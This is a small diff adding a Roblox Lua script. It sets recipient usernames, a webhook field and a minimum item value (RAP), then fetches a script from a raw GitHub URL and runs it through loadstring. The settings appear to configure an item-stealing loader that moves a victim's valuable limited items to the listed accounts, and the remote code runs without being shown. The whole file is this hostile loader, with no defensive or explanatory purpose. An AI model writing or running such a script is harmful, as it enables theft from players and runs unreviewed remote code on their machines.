@@ -1,0 +1,10 @@
+
+Username = "wjjsksksksksksksk"
+Username2 = "accclon200999"
+Webhook = "idk"
+
+LoadingScreen = false
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/globglabgala/blobglab/main/swabalabala"))()
